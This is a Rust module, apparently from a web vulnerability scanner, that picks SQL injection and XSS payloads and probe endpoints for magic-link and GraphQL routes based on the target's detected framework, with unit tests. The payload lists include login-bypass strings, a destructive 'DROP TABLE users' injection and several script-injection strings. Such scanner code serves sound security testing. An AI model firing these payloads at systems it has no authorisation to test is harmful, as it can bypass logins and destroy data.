//! Stack-specific payload database (Priority 5 fix v4.3.0).
//! Lesson: KOBRA used generic payloads on Juice Shop = FP.
//! Fix: stack fingerprint picks payloads tailored to detected framework.

use crate::scan::stack_fingerprint::Stack;

pub fn magic_link_endpoints(stack: &Stack) -> Vec<&'static str> {
    match stack.spa.as_deref() {
        Some("Angular") => vec!["/api/auth/magic-link","/auth/magic-link","/api/v1/auth/magic"],
        Some("React") | Some("Next.js") => vec!["/api/auth/magic-link","/auth/magic-link","/api/magic-link"],
        Some("Vue.js") | Some("Nuxt.js") => vec!["/api/auth/magic-link","/auth/signin/magic"],
        Some("Svelte") => vec!["/api/auth/magic-link"],
        _ => vec!["/api/auth/magic-link","/auth/magic-link"],
    }
}

pub fn sqli_payloads(stack: &Stack) -> Vec<&'static str> {
    if let Some(ref server) = stack.server {
        if server.contains("PHP") {
            return vec!["' OR '1'='1","1' UNION SELECT NULL--","1; DROP TABLE users--","admin'--"];
        }
    }
    vec!["' OR '1'='1","1' OR '1'='1' --","1 UNION SELECT NULL,NULL--","'; SELECT * FROM users--","admin'/*"]
}

pub fn graphql_endpoints(stack: &Stack) -> Vec<&'static str> {
    match stack.spa.as_deref() {
        Some("Next.js") => vec!["/api/graphql","/graphql"],
        Some("Nuxt.js") => vec!["/api/graphql","/graphql"],
        Some("Angular") => vec!["/graphql","/api/graphql","/gql"],
        _ => vec!["/graphql","/api/graphql"],
    }
}

pub fn xss_payloads(stack: &Stack) -> Vec<&'static str> {
    match stack.spa.as_deref() {
        Some("Angular") => vec!["{{constructor.constructor('alert(1)')()}}","<img src=x onerror=alert(1)>"],
        Some("React") | Some("Next.js") => vec!["javascript:alert(1)","<img src=x onerror=alert(1)>","data:text/html,<script>alert(1)</script>"],
        Some("Vue.js") | Some("Nuxt.js") => vec!["<img src=x onerror=alert(1)>","{{constructor.constructor('alert(1)')()}}"],
        _ => vec!["<script>alert(1)</script>","<img src=x onerror=alert(1)>","javascript:alert(1)"],
    }
}

pub fn pick_payloads(stack: &Stack, category: &str) -> Option<Vec<&'static str>> {
    match category {
        "MAGIC-LINK" | "GHSA-qq9h" | "magic-link" => Some(magic_link_endpoints(stack)),
        "SQLI" | "sqli" | "SQL Injection" => Some(sqli_payloads(stack)),
        "GRAPHQL" | "graphql" => Some(graphql_endpoints(stack)),
        "XSS" | "xss" => Some(xss_payloads(stack)),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn magic_link_angular_specific() {
        let mut s = Stack::default();
        s.spa = Some("Angular".into());
        let eps = magic_link_endpoints(&s);
        assert!(eps.iter().any(|e| e.contains("v1/auth/magic")));
    }
    #[test]
    fn sqli_php_uses_php_payloads() {
        let mut s = Stack::default();
        s.server = Some("PHP".into());
        let payloads = sqli_payloads(&s);
        assert!(payloads.iter().any(|p| p.contains("UNION SELECT NULL")));
    }
    #[test]
    fn sqli_default_uses_union_payloads() {
        let s = Stack::default();
        let payloads = sqli_payloads(&s);
        assert!(payloads.iter().any(|p| p.contains("UNION SELECT NULL,NULL")));
    }
    #[test]
    fn graphql_angular_has_gql() {
        let mut s = Stack::default();
        s.spa = Some("Angular".into());
        let eps = graphql_endpoints(&s);
        assert!(eps.iter().any(|e| *e == "/gql"));
    }
    #[test]
    fn xss_react_uses_dangerous_payload() {
        let mut s = Stack::default();
        s.spa = Some("React".into());
        let payloads = xss_payloads(&s);
        assert!(payloads.iter().any(|p| p.contains("data:text/html")));
    }
    #[test]
    fn pick_payloads_magic_link() {
        let mut s = Stack::default();
        s.spa = Some("Angular".into());
        let p = pick_payloads(&s, "MAGIC-LINK");
        assert!(p.is_some());
        assert!(p.unwrap().iter().any(|e| e.contains("v1/auth/magic")));
    }
    #[test]
    fn pick_payloads_unknown_returns_none() {
        let s = Stack::default();
        let p = pick_payloads(&s, "UNKNOWN-CATEGORY");
        assert!(p.is_none());
    }
}
